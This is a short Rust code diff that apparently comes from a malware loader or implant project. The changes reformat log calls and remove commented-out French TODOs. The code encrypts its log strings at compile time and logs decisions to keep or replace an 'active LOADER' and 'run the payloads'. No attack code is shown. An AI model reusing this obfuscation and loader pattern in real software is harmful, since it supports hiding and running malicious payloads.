@@ -59,21 +59,21 @@ impl PoolLinks {
                 info!("{}", encrypt_string!("same config: Yes"));
                 info!(
                     "{}",
-                    encrypt_string!("[+] DECISION: keep the same active LOADER, and run the payloads")
+                    encrypt_string!(
+                        "[+] DECISION: keep the same active LOADER, and run the payloads"
+                    )
                 );
                 bail!("{}", encrypt_string!("Found same loader"))
             }
             warn!("{}", encrypt_string!("same config: No"));
             info!(
                 "{}",
-                encrypt_string!("[+] DECISION: replace the active LOADER by this one, and run the payloads")
+                encrypt_string!(
+                    "[+] DECISION: replace the active LOADER by this one, and run the payloads"
+                )
             );
             return Ok(newconf);
         }
         bail!("{}", encrypt_string!("NOconfigfound"))
     }
-    // TODO remplace ça !
-    // et on pourait renvoyer un booléen pour PAS updater la conf, si on a pas la flemme.
-    //let newconf = config.clone();
-    //(false, newconf)
 }
